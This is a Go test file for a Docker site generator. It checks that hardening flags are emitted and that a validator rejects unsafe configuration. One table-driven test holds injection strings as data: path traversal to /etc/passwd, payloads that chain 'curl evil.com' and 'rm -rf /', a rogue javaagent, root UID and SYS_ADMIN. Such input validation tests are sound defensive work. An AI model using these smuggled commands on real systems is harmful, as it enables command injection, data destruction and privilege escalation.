package sitegenerator

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestGenerateTomcatSite(t *testing.T) {
	tempBase := t.TempDir()

	cfg := NewSiteConfig("tomcat.app.internal", SiteTypeTomcat)
	cfg.BaseDir = tempBase
	cfg.Resources.CPULimit = "2.0"
	cfg.Resources.MemoryLimit = "4096M"
	cfg.Tomcat.MinHeap = "1024m"
	cfg.Tomcat.MaxHeap = "3072m"

	gen := NewGenerator(false)
	res, err := gen.GenerateSite(cfg)
	if err != nil {
		t.Fatalf("Failed to generate Tomcat site: %v", err)
	}

	// 1. Verify Directories Created
	expectedDirs := []string{
		filepath.Join(tempBase, "tomcat.app.internal"),
		filepath.Join(tempBase, "tomcat.app.internal", "data"),
		filepath.Join(tempBase, "tomcat.app.internal", "logs"),
		filepath.Join(tempBase, "tomcat.app.internal", "config"),
		filepath.Join(tempBase, "tomcat.app.internal", "webapps"),
		filepath.Join(tempBase, "tomcat.app.internal", "webapps", "ROOT"),
	}

	for _, d := range expectedDirs {
		info, err := os.Stat(d)
		if err != nil {
			t.Errorf("Expected directory %s to exist, error: %v", d, err)
		} else if !info.IsDir() {
			t.Errorf("Expected %s to be directory", d)
		}
	}

	// 2. Verify .env content
	envData, err := os.ReadFile(res.EnvPath)
	if err != nil {
		t.Fatalf("Failed to read .env file: %v", err)
	}
	envStr := string(envData)
	if !strings.Contains(envStr, "SITE_DOMAIN=tomcat.app.internal") {
		t.Errorf("Missing SITE_DOMAIN in .env")
	}
	if !strings.Contains(envStr, "-Xms1024m -Xmx3072m") {
		t.Errorf("Missing JVM heap parameters in .env: %s", envStr)
	}
	if !strings.Contains(envStr, "UID=1001") {
		t.Errorf("Missing UID=1001 in .env")
	}

	// 3. Verify docker-compose.yml rootless & security flags
	composeData, err := os.ReadFile(res.ComposePath)
	if err != nil {
		t.Fatalf("Failed to read docker-compose.yml: %v", err)
	}
	composeStr := string(composeData)

	checks := []string{
		"no-new-privileges:true",
		"- ALL",
		"user: \"${UID}:${GID}\"",
		"read_only: true",
		"cap_add: []",
		"panel-network",
		"expose:\n      - \"${APP_PORT}\"",
	}

	for _, check := range checks {
		if !strings.Contains(composeStr, check) {
			t.Errorf("docker-compose.yml missing expected security line: '%s'", check)
		}
	}

	// Verify NO raw host ports are bound
	if strings.Contains(composeStr, "ports:") {
		t.Errorf("docker-compose.yml contains forbidden host port binding 'ports:'")
	}
}

func TestGeneratePythonSite(t *testing.T) {
	tempBase := t.TempDir()

	cfg := NewSiteConfig("api.python.internal", SiteTypePython)
	cfg.BaseDir = tempBase
	cfg.Python.Runner = PythonRunnerUvicorn
	cfg.Python.AppModule = "app.server:app"
	cfg.Python.Workers = 4

	gen := NewGenerator(false)
	res, err := gen.GenerateSite(cfg)
	if err != nil {
		t.Fatalf("Failed to generate Python site: %v", err)
	}

	// Verify Python files created
	mainPy := filepath.Join(tempBase, "api.python.internal", "app", "main.py")
	if _, err := os.Stat(mainPy); err != nil {
		t.Errorf("Expected starter app/main.py to exist: %v", err)
	}

	// Verify Compose content
	composeData, err := os.ReadFile(res.ComposePath)
	if err != nil {
		t.Fatalf("Failed to read compose file: %v", err)
	}
	composeStr := string(composeData)

	if !strings.Contains(composeStr, "uvicorn") {
		t.Errorf("Expected uvicorn command in compose, got: %s", composeStr)
	}
	if !strings.Contains(composeStr, "no-new-privileges:true") {
		t.Errorf("Expected no-new-privileges:true in compose")
	}
}

func TestValidationRejectsInjectionsAndEscapes(t *testing.T) {
	tests := []struct {
		name        string
		modify      func(cfg *SiteConfig)
		errContains string
	}{
		{
			name: "Domain Traversal",
			modify: func(cfg *SiteConfig) {
				cfg.Domain = "../../etc/passwd"
			},
			errContains: "illegal path characters",
		},
		{
			name: "Domain Command Injection",
			modify: func(cfg *SiteConfig) {
				cfg.Domain = "site.com;curl evil.com"
			},
			errContains: "does not match RFC 1123",
		},
		{
			name: "Root UID Escalation (UID=0)",
			modify: func(cfg *SiteConfig) {
				cfg.Security.UID = 0
			},
			errContains: "rootless policy requires UID >= 1000",
		},
		{
			name: "Dangerous Capability Addition",
			modify: func(cfg *SiteConfig) {
				cfg.Security.AddCaps = append(cfg.Security.AddCaps, "SYS_ADMIN")
			},
			errContains: "forbidden capability in add_caps: 'SYS_ADMIN'",
		},
		{
			name: "Missing CapDrop ALL",
			modify: func(cfg *SiteConfig) {
				cfg.Security.DropCaps = []string{"NET_RAW"}
			},
			errContains: "must include 'ALL' in drop_caps",
		},
		{
			name: "JVM Flag Command Injection",
			modify: func(cfg *SiteConfig) {
				cfg.Tomcat.CustomJVMOptions = []string{"-Xmx512m; rm -rf /"}
			},
			errContains: "unsafe shell metacharacters",
		},
		{
			name: "Prohibited Javaagent Injection",
			modify: func(cfg *SiteConfig) {
				cfg.Tomcat.CustomJVMOptions = []string{"-javaagent:/tmp/evil.jar"}
			},
			errContains: "arbitrary agent loading is disabled",
		},
		{
			name: "Python Entrypoint Metacharacters",
			modify: func(cfg *SiteConfig) {
				cfg.Python.AppModule = "main:app && curl evil.com"
			},
			errContains: "invalid python app_module entrypoint",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := NewSiteConfig("valid.example.com", SiteTypeTomcat)
			if strings.Contains(tt.name, "Python") {
				cfg = NewSiteConfig("valid.example.com", SiteTypePython)
			}
			tt.modify(cfg)

			err := ValidateConfig(cfg)
			if err == nil {
				t.Fatalf("Expected validation error containing '%s', got nil", tt.errContains)
			}
			if !strings.Contains(err.Error(), tt.errContains) {
				t.Errorf("Expected error message to contain '%s', got '%s'", tt.errContains, err.Error())
			}
		})
	}
}
